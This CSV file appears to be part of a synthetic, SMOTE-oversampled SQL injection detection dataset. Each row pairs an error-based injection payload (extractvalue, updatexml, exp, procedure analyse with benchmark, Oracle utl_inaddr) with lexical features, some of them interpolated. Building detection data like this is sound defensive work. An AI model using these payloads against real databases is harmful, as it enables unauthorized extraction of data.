id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000254,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000007,0.7884436727707258,127.20725386422616,39.0,4.265889893690992,66.53454231070435,1.8218192297652145,43.13816924281744,15.712723080939147,0.5240007094211957,0.014509943023763877,0.3382346420761069,0.12325470547893354,3.0,0.0,0.0,0.0,0.0,2.821819229765213,0.0,4.7127230809391465,2.7755575615628914e-17,3.0,0.0,2.821819229765213,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8218192297652133,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.821819229765214
SMOTE_000255,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000199,0.09549628469199545,144.95650937841782,32.956509378417806,3.876966227519113,50.0,23.0,54.0,17.956509378417806,0.34493173041566616,0.15866859599120645,0.3725262688489195,0.12387340474420792,0.9565093784178073,0.0,0.0,0.0,0.0,0.0,0.0,12.0,2.7755575615628914e-17,0.0,4.0,0.0,0.9565093784178074,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000093,0.0,133.0,29.0,3.7442941285734888,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000257,attack,error,"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000191,0.38426066331991066,174.25073473159566,34.0,3.86775256147225,56.43805104869674,32.0,64.81268368289892,21.0,0.32367496663794887,0.18373604131428464,0.37201221493526715,0.1205767771124993,1.0,0.0,2.0,0.0,0.0,1.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000258,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'vedm'  =  'vedm",nearest_attack_euclidean,R000198,0.14355605419996817,185.0,27.375177322617358,3.6101530917416738,45.0,39.0,75.0,26.0,0.24324324324324326,0.21081081081081082,0.40540540540540543,0.14054054054054055,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000259,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.18284528776517886,171.15540712411118,27.082529080293654,3.639043142753288,47.0,35.0,65.99034896352387,23.16505816058731,0.27473452254369485,0.2045895380644536,0.38533433058605593,0.13534160880579557,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.16505816058731,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000260,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000302,0.1085576711591823,144.43532206133787,26.0,3.6645335313462226,34.0,39.0,52.5482576490703,18.887064412267577,0.23542852462633065,0.27005036648314396,0.363764792604152,0.13075631628637335,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.887064412267575,2.7755575615628914e-17,0.0,6.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000261,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R000225,0.35042715749914,170.0,27.8472806667044,3.6796713649891744,47.0,35.0,65.0,23.0,0.27647058823529413,0.20588235294117646,0.38235294117647056,0.13529411764705881,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000262,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000014,0.009456457646683519,192.98534647948702,31.993719919780155,3.7399873005445428,58.974879679120626,32.0,77.00418672014656,25.006280080219845,0.3055885101058706,0.16581617116988176,0.39901767112562775,0.1295776475986198,4.0,0.0,0.0,0.0,1.0,1.0020933600732813,0.0,14.0,0.0041867201465626835,0.0,4.0,2.0020933600732813,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000263,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",nearest_attack_euclidean,R000072,0.9370779617823808,165.7681743723979,29.046365125520417,3.813097092258408,48.0,35.0,60.81453949791834,21.953634874479583,0.28982338564254473,0.21132955203102222,0.36647251897636013,0.13237454335007287,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.953634874479585,2.7755575615628914e-17,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000264,attack,error,"1%'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000082,0.3579919044965414,178.1398987536396,27.0,3.515629247950351,36.1398987536396,39.0,75.0,28.0,0.20287068052905727,0.21892988351666737,0.42101900676282183,0.15718042919145347,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1398987536396012,0.8601012463603988,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000265,attack,error,"1""  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  ""stcv""  =  ""stcv",nearest_attack_euclidean,R000223,1.8098664803968787,171.48363372113758,30.0,3.794004569289451,61.56282945727219,24.0,64.09292635681953,21.82787790704586,0.3595344967901679,0.14004794460215828,0.37326592149418464,0.1271516371134892,0.0,3.999999999999999,0.0,0.0,0.0,0.6092926356819535,0.0,13.218585271363906,2.7755575615628914e-17,0.0,4.0,0.6092926356819535,0.0,1.0,0.0,0.0,0.0,0.6092926356819535,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000266,attack,error,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000070,0.0256033437431879,178.05698860275774,36.0,3.975481100965143,61.0,31.0,66.05698860275774,20.0,0.3425904889848491,0.17410336325459544,0.3709813972737197,0.11232475048683577,0.0,0.9905018995403756,0.0,0.0,0.0,1.0,0.0,13.009498100459624,2.7755575615628914e-17,0.0,4.0,1.0,0.0,0.9905018995403756,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000267,attack,error,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,nearest_attack_euclidean,R000033,0.012543111296025063,155.0,27.011022857717297,3.7742397184329786,37.033068573151894,38.95590856913081,55.022045715434594,23.988977142282703,0.23892302305259283,0.2513284423814891,0.35498094009957804,0.15476759446634003,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.988977142282703,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000268,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R000025,1.5415741586888947,192.0,29.953808809180106,3.6455316195772927,56.43071321377016,32.0,78.0461911908199,25.52309559540995,0.2939099646550529,0.16666666666666666,0.4064905791188536,0.1329327895594268,4.0,0.0,0.0,0.0,1.0,1.5230955954099465,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.5230955954099468,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.5230955954099468,0.47690440459005334,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000269,attack,error,"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",nearest_attack_euclidean,R000109,0.09553353922310721,185.0,29.886217088188292,3.850539571377316,48.17067436771756,46.772434176376585,66.0,24.056891455905852,0.26038202360928414,0.25282396852095457,0.3567567567567568,0.13003725111300463,2.1137829118117066,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.943108544094146,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000270,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,1.0635949743850532,173.92837142053912,32.87297142678647,3.8352326403950476,56.618914280359405,32.0,64.87297142678646,20.436485713393235,0.3253067161009526,0.18410424300173345,0.3730854213486427,0.1175036195486713,0.43648571339323483,0.0,2.0,0.0,0.0,1.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,3.0,0.4364857133932348,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000271,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",nearest_attack_euclidean,R000276,0.5530920313839879,178.33853440651654,30.0,3.7045160455919923,60.0,24.0,70.86160091987132,23.476933486645223,0.3368008446140289,0.13472033784561158,0.39684836950368424,0.13163044803667523,4.0,0.0,0.0,0.0,0.0,1.0,0.0,14.47693348664522,2.7755575615628914e-17,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000272,attack,error,"1"" where 5406  =  5406 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000190,0.2263443368391148,164.32106384034373,31.0,3.889812695102893,42.5356301170024,43.71417348933653,57.71417348933653,20.357086744668266,0.2588813896881817,0.26599260529586377,0.3512661540166817,0.12385985099927282,0.0,1.0,2.0,0.0,0.0,2.0,0.0,10.178543372334133,2.7755575615628914e-17,0.0,5.178543372334133,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000273,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""eiuc"" like ""eiuc",nearest_attack_euclidean,R000063,1.0640499622263722,161.5422543572315,28.5422543572315,3.878514041562131,48.7957805006205,36.830982571074,55.0,20.915491285537,0.30199828289718894,0.22803620404918662,0.3404714366364645,0.12949407641715988,0.0,3.999999999999999,0.0,0.0,0.0,1.4577456427685,0.0,10.0,2.7755575615628914e-17,0.0,5.4577456427685,1.4577456427685,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000274,attack,error,"1""  )   as sstd where 9629  =  9629 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000193,0.5122889473179109,174.0,31.230515895322736,3.883821320016456,44.92288692149205,45.76948410467726,61.61525794766137,21.692371026169315,0.2581775110430578,0.26304301209584635,0.3541106778601228,0.1246687990009731,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,5.692371026169316,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000275,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000283,0.25417622210788615,156.14465280705403,32.73681624832432,3.724698874185182,49.93420406208108,23.06579593791892,63.34204062081079,19.802612186243238,0.3199061127651286,0.14782390957585934,0.4054955147653856,0.12677446289362648,0.0,1.0,0.0,0.0,0.0,0.0,0.0,13.868408124162158,2.7755575615628914e-17,0.0,4.0,0.0,0.0,1.0,0.0,0.9342040620810795,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,error,"1"" where 5334  =  5334 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000043,0.09885701349079555,191.96127657075104,32.92255314150206,3.6874344559555965,48.0,40.0,79.0,24.96127657075103,0.25005068511681805,0.2083755709306817,0.41154175258809633,0.13003199136440396,0.0,0.9612765707510271,2.0,0.0,1.0,2.0,0.0,14.0,2.7755575615628914e-17,0.0,4.0,5.0,0.0,0.9612765707510269,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000277,attack,error,"1',updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000141,0.9856173311318076,139.134992571092,27.0,3.6905402951612203,33.08999504739467,37.60666996840355,49.7866600631929,18.651667492100888,0.23742670166033586,0.27095549723277357,0.3573347422795593,0.13428305882733127,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.348332507899112,2.7755575615628914e-17,0.0,6.303334984201776,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.3483325078991121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.348332507899112
SMOTE_000278,attack,error,"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000170,0.06148193996128413,135.12634168475964,24.063170842379826,3.5983571819387103,34.094756263569735,35.0,49.063170842379826,16.968414578810087,0.2523046351345636,0.2590236099671416,0.36308752044593945,0.1255842344523553,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.968414578810087,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.03158542118991248,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0315854211899125
SMOTE_000279,attack,error,"1""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""wvkp"" like ""wvkp",nearest_attack_euclidean,R000053,0.7498255247812243,170.6457663125369,29.29153262507377,3.8277281843955917,46.58306525014754,39.0,61.70846737492623,23.354233687463115,0.2729517500782064,0.22854541155180808,0.36163591936868367,0.13686691900130182,0.0,3.999999999999999,0.0,0.0,0.0,1.354233687463114,0.0,12.0,2.7755575615628914e-17,0.0,6.0,1.3542336874631138,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000280,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000176,0.016310265458940924,139.04790994846502,25.009581989693004,3.6775036171272864,34.02874596907901,38.96167204122799,49.05749193815801,17.0,0.2447225595250885,0.28021602346825314,0.3527999496367495,0.12226146736990881,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.009581989693002,2.7755575615628914e-17,0.0,5.990418010306998,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000281,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""ikhr""  =  ""ikhr",nearest_attack_euclidean,R000231,0.790038760325454,167.08979675626358,30.810018476703313,3.855060092179671,60.759926093186756,24.0,61.13988913978013,21.189981523296687,0.36363636363636365,0.1437274406973028,0.3657952445829169,0.12684095108341661,0.0,3.999999999999999,0.0,0.0,0.0,0.8100184767033113,0.0,12.379963046593378,2.7755575615628914e-17,0.0,4.0,0.8100184767033112,0.0,1.0,0.0,0.0,0.0,0.8100184767033113,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000282,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""rfpq""  =  ""rfpq",nearest_attack_euclidean,R000064,0.6835517443552263,174.9660944723124,29.433415075383945,3.745881046268166,47.150122613075915,36.13316984923211,67.83292462308029,23.849877386924085,0.27009004052995056,0.2064156389343372,0.3872809852962359,0.13621333523947632,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,12.566584924616057,2.7755575615628914e-17,0.0,5.283292462308029,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
